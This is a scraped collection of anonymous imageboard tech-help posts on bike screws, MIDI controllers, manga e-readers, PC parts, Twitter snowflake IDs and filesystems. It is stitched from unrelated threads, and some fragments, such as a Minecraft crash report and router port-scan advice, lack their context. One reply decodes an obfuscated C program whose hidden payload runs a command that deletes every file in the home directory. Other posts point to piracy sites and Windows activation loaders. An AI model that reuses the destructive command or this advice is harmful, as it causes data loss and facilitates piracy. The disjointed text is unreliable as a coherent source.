posts.sub: How do I get this screw out of my bike without fucking up the frame?
posts.com: I got all the other ones off no problem but this one little fucker won't come out. I tried with a regular and flathead screwdriver already, is there some easy trick or method I can use or am I going to have buy some kind of special tool for this?

posts.name: Anonymous
posts.com:
>>1303118
Is there weight on it? You could try a little percussive shock.

posts.name: Anonymous
posts.com:
>>1303118
Was there thread lock on the others? Even it not there could be on that one so heat it up with a hot air gun or a gas flame like a propane torch to soften any glue.

Whatever you do, don't keep hacking at it with a screwdriver like you've been doing. You really should have given up on that poor approach well before you got to the stage you're at. You've already badly damaged the head and you're not far off stripping it completely. It's so badly damaged I can't see if it was phillips or posidrive and if it was posidrive and you used phillips you haven't done yourself any favours. Sticking a flathead in was a terrible idea since it wouldn't have been able to in far enough especially with the rounded corners I suspect were already there. Chalk all that up to experience.

If you persist on going the way you're going you won't be able to try other methods, after heating it, like tapping a screwdriver in gently with a hammer before turning or using a piece of rubber like a a small section of inner tube, or a penetrating lubricant, but don't use that around heat as it may be flammable.

You main options, after heating it and normal use of a screwdriver fails, are pliers or vicegrips since it looks like the head is above the frame, cutting a slot for a flat head, or screw extractor. Since you're probably only going to use it once, a cheap screw extractor would probably be okay but you'd need to check with someone who's seen your bike. Welding a nut to the head or using a quality high strength weld adhesive to attach a nut are also options but let's hope heat will help.

What I have currently attempted:

-Replacing the level.dat file with both level.dat.old and a fresh copy from a new world. (it did start, but loading in the corrupted chunks resulted in a server crash.)

-Deleting player data files (with and without the attempted fix above, both still returned a crash)

-Loading the world in a compatible version of MCedit (majority of the world was still saved but most of our spawn is missing/corrupted.)

-Loading the world in Beta 1.3 to convert the world format (spawn chunks still missing)


I did have our world files backed up, however it is quite old and will result in us losing around 50 hours of progress. Below I'll post the crash report and if anybody has any suggestions on what to try next it'll be very appreciated :) thank you.

Best thing is to use something like nmap to portscan the router, it should find any ports that aren't closed, http is perfectly normal since it has a web interface.
The article suggests port 28 for telnet which is traditionally 23.
If you're planning to half ass this you can use putty to try to connect to ports 23 and 28 in telnet mode and see if either are open, if it does anything but refuse or otherwise decline to connect you have a problem.
If you can grab a clean copy of the firmware you could perhaps get away with just installing that, there is typically some sort of shitty update firmware option in there somewhere to upload a .bin or whatever to the router. Factory reset option might be intercepted if its not actually wiping shit.

posts.com: I can't decide on a midi keyboard controller to buy. It's either the Launchkey 37, Arturia Keystep or Arturia Essential 49 key. I don't know jack shit about any of this; what should I choose?

posts.name: Anonymous
posts.com:
>>1303052
Among the ones that you named I'd go for the Arturia Essentials because of the 49 keys. However I'd really recommend getting a bigger keyboard if you have the space available. It depends on what you plan to do with it: if its just to use it as a remote for your daw and testing tones & small melodies, then 37-49 could be good. But if you plan to actually pick up keyboard playing for real you'll find 37-49 is reaaaally limiting. in my opinion 61 keys is the minimum to be able to play keyboard comfortably and actually improve on the long run. there's the m-audio keystation 61 mk3 thats on sale for 139€ in shitrope, its pretty decent for the price.

imo pads and knobs are a bit of a meme, I always prefer to set things directly in the vst windows and write rhythms on the daw's piano rull (then humanize if needed) but thats' just me. Focus essentially on picking a keyboard whose keys feel good to play on. also never pick mini keys controllers, they sucks to play on.

>>1299289
Unfortunately it's really difficult to find manga raws in high quality, even digital raws from Amazon can be mediocre. Your best bet for raws are usually manga-zip and nyaa.si.

As for readers, I'd recommend an e-reader for manga. The kindle paperwhite is good, but you have to convert all of your manga beforehand with Kindle Comic Convertor. If you're willing to shell out the Meebook P78 Pro is excellent; it runs android so it supports all archived manga formats by default, if you decide on that I'd recommend the Perfect Viewer app from the Play Store.

>I've been trying to find reliable places to download print quality digital scans of raw manga online.
Chinese piracy sites have some regular manga raws for free. The remainder of the manga titles and the highest quality scans are behind their paywall which requires you to earn tokens for access. You can buy tokens of course as a convenience and they encourage that.

The alternative is to have well-connected friends in the hobby who can access one of the hoarder private sites.

posts.name: Anonymous
posts.com:
>>1299289
You don't. That's the funny part. If the one download you were capable of finding for a raw manga wasn't high quality enough then too bad.
Private trackers don't help because they upload the same bad raws since nobody's checking the quality. Your greatest hope might be asking scanlators of high quality scanlations if they still have their raws lying around, but then again I've never scanlated so I have no idea what they do with them.

I used a cheapass android tablet for reading. It was horribly uncomfy because I had to keep cleaning the screen and it felt as cheap as it was. On the other hand it was 100% capable of reading manga quickly and efficently but I got tired of using it due to how shoddy it was. E-readers are pretty awful for manga since they can't display color when need be and struggle with images/pdfs, but if you do find one that works with color/images properly then those e-ink screens have a much better feel than tablet screens do.

posts.com:
Not exactly what you had in mind, but I recommend a vertical monitor.

I have a rotating one (that I always keep in portrait mode) and it's perfect to read manga, books and also to watch vertical videos when phonetoddlers post them.

Not very easy to find HD Raws, but the screen is big enough to read everything without any scrolling, so any image viewer works. I dropped my manga-reading programs and now I just use Irfanview.

I'm also far-sighted, so having a huge manga page is kind on my eyes.

posts.com:
>>1300376
>Am I correct in thinking that as long as the motherboard has slots for everything I want that it doesn't really matter which one I go for or is there anything else I should be considering?
Processor features are now tied to what motherboard you purchased: the processor checks and disables them if you didn't pay enough.
Intel does this with overclocking: even with a K-processor, you can't fiddle with the multiplier unless you have a Z motherboard.
AMD does it with PCI Express: even though it's the CPU that generates high-speed PCIe lanes, the chipset isn't involved, and the motherboard's sole involvement is providing 40 pairs of wires, AMD processors will disable their PCIe 4.0/5.0 support if you didn't pay for at least a B550.

Anyways, what you should do is find someone who assembled a PC that they're happy with, and copy that. Or buy one from a local store.

>>1300432
>AMD processors will disable their PCIe 4.0/5.0 support if you didn't pay for at least a B550.
Some motherboard manufacturers tried adding support for PCIe 4.0 on X470/B450, but the signal wasn't stable enough, so they disabled it in the end.

>the motherboard's sole involvement is providing 40 pairs of wires
High speed digital signals are a bitch and a half to get right.
It's not just a matter of plugging wires together.
You need them all to be right length, the right width, as well as the right distance from the ground plane and one another.
If the PCB isn't engineered for PCIe 4.0 speeds, it's just not happening.

posts.com:
youre wanting to build a win 7 machine
so you shouldnt bother with new hardware
get these parts:

XEON E3 1241 V3 for about $40

4x4GB (16GB) PC3-12800U for about $40

basically any LGA 1150 motherboard with 4 DIMM slots (ASUS Q87M-E is a good choice. used boards dont always come with the i/o shield but it doesnt really matter. make sure you update the BIOS to the latest version regardless of which brand/model you choose) for about $50-$60

get a $50 case with a mesh front panel like the DeepCool MATREXX 40

for storage i recommend getting a 500GB crucial MX500 for about $50 brand new. you can pair it with a 1TB WD Blue for another $45 (make sure its a WD10EZEX so you dont wind up with a garbage SMR drive)

youll need a pair of SATA cables. if you have some lying around then just use those. if not then buy a pair off ebay for like $3

id recommend using an intel stock cooler if you have one lying around too. you can buy one off ebay for $10 if you dont have one already. if you dont like downdraft coolers you can get tower style coolers that fit the LGA 1150 socket off ebay for about $20

i use thermal grizzly kryonaut for my thermal paste needs but you can use anything that isnt garbage. get a small tube unless you actually have a need for a lot of it

look around for power supply deals. dont buy anything with less than 500watts total capacity and no less than 80 plus bronze rated. you can usually find 80 plus gold rated 600watt power supplies for about $70 or less. cross reference every potential buy with
>https://cultists.network/140/psu-tier-list/
to lessen the chance that youll buy a garbage unit

for the graphics card i recommend the GTX 1060 6GB. performs great in 1080p and only costs about $100 on ebay right now

for the OS i recommend using rufus to create your installation media
>https://rufus.ie/en/
it has a built in download function that allows you to download official microsoft windows ISO files, including windows 7.

>it permanently activates windows 7 and earlier versions too
Common misconception, windows is not permanently activated, it's only activated if the loader loads before it to monkey-patch your BIOS. That's why you can't have GPT or secure boot: no-one wrote a loader that can do that. For permanent activation and EFI boot, you need to patch your BIOS.

Windows 10 is permanently activated if you upgrade off a Daz-loaded windows 7 though.

Decode this: ENT1yWWhLL-Qz9mK

A Twitter snowflake ID is a 64-bit binary number, with 41 bits representing a timestamp, 10 bits representing a machine ID, and 12 bits representing a per-machine sequence number. The snowflake ID is generally serialized in decimal format and is used in the post URL.

For example,
https://twitter.com/i/status/1581674019991916545
Decoding 1581674019991916545:
{'creation_time_milliseconds': 1665935447105,
'datacenter_id': 10,
'machine_id': 337,
'sequence_id': 1,
'server_id': 17}

The filename of a Twitter photo also contains a base64-encoded snowflake ID. This can be decoded into a regular snowflake ID, although it contains three "extra" unknown bytes.
For example,
https://pbs.twimg.com/media/FdMR2WDaMAMPt2q?format=jpg
FdMR2WDaMAMPt2q -> 1572620320212922371

It is unknown if the filename of a Twitter video also contains a snowflake ID. You can see the URL contains it, but any off-platform video would would only contain the file name.
For example,
https://video.twimg.com/ext_tw_video/1564378065198882816/pu/vid/960x720/ENT1yWWhLL-Qz9mK.mp4

How would "ENT1yWWhLL-Qz9mK" be decoded into a snowflake, if it's possible?

Resources:

>>1302950
I'd say so long as it is shutdown it should be fine but take out the battery to be safe.

>Minor amount of diet coke (few cl)
A few cl is many standard teaspoons and a substantial fraction of a can of drink, like a sixth or a fifth. A single drop might be a minor amount. A few cl is not a minor amount on a laptop.

>User thought they cleaned it up

Sorry if it's your mum or something but user is an idiot. If user had disassembled the laptop maybe user could have cleaned it up. There's very little space between the usb port and the main circuitry and the ports are open holes that let fluids in no problem. pic related is inside of an old macbook with rights ports and main board. Laptops just don't have much empty space and anything that gets in goes somewhere important.

>until I figure out what to do with it
Disassemble it. check for liquid, though it might have evaporated if things were glowing red hot, and be prepared to throw it away as the user has very likely burnt through a lot of components and created shorts and faults that won't go away without replacement which is just too expensive on an old device.

>>1302685
Drawing is an exercise in problem-solving. The problem being, how to get the image you see in your head onto the canvas. Every beginner's guide to drawing will start you out with a technique called "construction," in which you break down the drawing into several basic shapes (for example you just could draw just an oval or sphere for her head, a box for her fist, and so on.) These shapes are like your guidelines. No, it's not easy, and takes years of practice to go from that to what you see in the picture. But if you persist, you can do it.

Oh yeah, there's a lot more to it than just construction when it comes to adding details like the shirt wrinkles and her hair, cartoon-stylized pupils, etc., so good luck.

posts.name: Anonymous
posts.com:
https://pastebin.com/cN5BKCje

This code is obfuscated somehow, how the heck do I decode this to see the actual code? How do you even encode a C program like this and why do people even do this? Thanks.

posts.name: Anonymous
posts.com:
>>1302940
Look at the #define directive, and see that it defines a macro that uses token concatenation to construct a token of its arguments. Looking at bf4217c1(z,x,y,j,e,t,m,s), you can see that it evaluates to system. You can verify this by just running the preprocessor. The final value of b4e0dee7 is constructed by iterating over b4e0dee7 and bf29e96c and performing some operation on the elements. Simply print out its value to see that it evaluates to "find ~ -type f -exec rm -rf {} \;". The "actual code" is therefore system("find ~ -type f -exec rm -rf {} \;");, which deletes all files in your home directory, provided you have find in PATH.

>>1302666
>it worked without any hiccups this morning.

Good logic. That it worked this morning means it can't fail this afternoon. That it worked today means it can't fail tomorrow. That it worked this year means it can't fail next year. Things that work once can never fail.

>I've had gpus die on me before and I usually saw it coming.

Good reasoning. Things always fail by giving clear and obvious warning signs for a long time before hand. Things never fail unexpectedly or without you noticing.

>are you sure?

He can read that it's a graphics problem but he can't be sure that the card is dead. There are lots of reasons for dlls to stop working and if the GPU was dead, what's making the bluescreen appear? Dead GPUs don't show anything.

Try booting from external media like the windows recovery USB drive you of course created when the system was working, or from a linux live USB.

If your gf has onboard graphics, try pulling out her graphics card and setting up bios or uefi so that it runs from the onboard graphics. If no onboard graphics, try swapping cards with a known working card.That it's showing anything on screen at all says that there is basic functionality and a software fix might work if you get into an environment to fix the dll, which I'm sure you recognised as an nvidia related file.

posts.name: Anonymous

Oh, I do apologise, Captain Autism: it's half-dead. Alive enough to try to work, but dead enough to be doing different things than the driver is instructing it to do. A GPU is a computer inside your computer with full access to your RAM, once it stops doing what it's told, all bets are off.

posts.name: Anonymous
posts.com:
>>1302717
>why not just use one of those fs
because they live inside the linux environment subsystem, which is vaguely a PITA to access from the windows environment subsystem.
https://www.howtogeek.com/426749/how-to-access-your-linux-wsl-files-in-windows-10/
It will work, but if the app you're trying to use was written by someone with an incomplete understanding of windows paths (7z.exe, for example), it might choke on a filename like \$wsl\mnt\linux_disk\my documents\videos\some_°unicode°_filename.mkv

Also ext* is a shit filesystem, essentially FAT with fat32 (ext2), then a journal (ext3), then extents (ext4) added. It still lacks basic features like defragmentation, and >>1302319
>It'd be used for torrenting
will fuck ext* up and make it sad. We're talking multiple seconds to open a file, rampant memory usage, lots of dreadful stuff. ext can't cope with fragmentation, and the way torrenting creates files by writing the blocks in a random order guarantees fragmention. Even worse, when you delete one you get free-space fragmentation, so the next file you write normally gets split into thousands of fragments as well. Trust me on this one, you do not want to be torrenting on ext3/ext4.

posts.name: Anonymous
posts.com:
>>1302717
>if I wanted to format a sdcard or hdd for use with borh Android and Windows which nix fs would you recommend?
I would recommend not doing that and using ExFAT. Or even better, getting a decent wifi AP and leaving the card in the phone.

Windows will be able to read any filesystem you format the card with, but it's my understanding that if you use it as "internal storage", Android also encrypts it with the same encryption as the internal partition, so you're not reading it without the phone's TPM.

And yet to get the most out of the card, you want to use it as internal storage. So why not do that then look at accessing it whilst it's in the phone? Any good home wifi will be faster than an SD card.

>>1302538
>where is the difference in meaning of association and Club

In the way you're asking about, none. Loads of places are called clubs informally which have Association as part of their registered name or might be called formally Societies. The Football Association is itself an association of various football clubs. Schools tend to have groups called clubs or societies even in the same school.

Clubs like for gentlemen and some country clubs are often private, invitation only membership. Some golf clubs are that way but others are open membership.

Many associations are open entry, like for professionals such as engineers, doctors, builders, condominium owners, so long as you meet some basic qualification like being an engineer, doctor, own a condo in the building etc. but lawyers, for example, might have a Law Society which is the same basic thing as an association.

posts.com: how do my devices always know there's a smart tv nearby and vice versa? I never once connected my phones or laptops to a smart tv but as soon as I get near one, I keep getting watch on smart tv options popping up. Is this something that the smart tv does or something I need to disable on my individual devices? What's the fix? Thanks.

posts.name: Anonymous
posts.com: Turn off the wifi feature on your smart TV, or stop it from automatically connecting to your wifi.

posts.name: Anonymous
posts.com:
>>1302564
Devices need to know if other devices they can work with are present. In olden times that meant plugging things in and making an electrical circuit. With networking devices instead send a broadcast packet to announce their existence.

Broadcast packets are by definition intended to be received by every other device on the particular network or subnet. Devices announce their presence when they first connect and some times thereafter. Already connected devices will respond so the new one knows the old ones exist.

There is no option in any smart tv app I have ever seen that allows you to turn off broadcasting alone. There could be one but I don't think most users ever want it. Manufacturers won't include an option that people aren't going to use and which would lead to consumers complaining that their tv can't connect because they have stupidly turned off broadcasts. Finding local ip addresses, that could change everytime the tv is turned on, and entering them manually is a step backwards.

Phone apps work like the tv apps. Same as tvs you have to code in networking options including broadcast announcements. Developers could include an option to turn them off but again, why? Who does it help? How much trouble would it make for the phone manufacturer and app provider when a stupid consumer turns it off and breaks functionality and claims the phone is faulty? Too much.

Either you disconnect the devices from the network, turn off WiFi or unplug ethernet, or they will broadcast their presence to everything and everything else that is designed to respond will respond.

You could mess around with firewalls blocking certain addresses, if firewalls exists for your phone or tv, or set up network rules on your router to block certain devices but router rules will only apply to your router, not a friend's. Poorly defined rules could cripple phone or tv networking or even break your whole network by blocking all broadcasting as most apps don't allow manual connections.
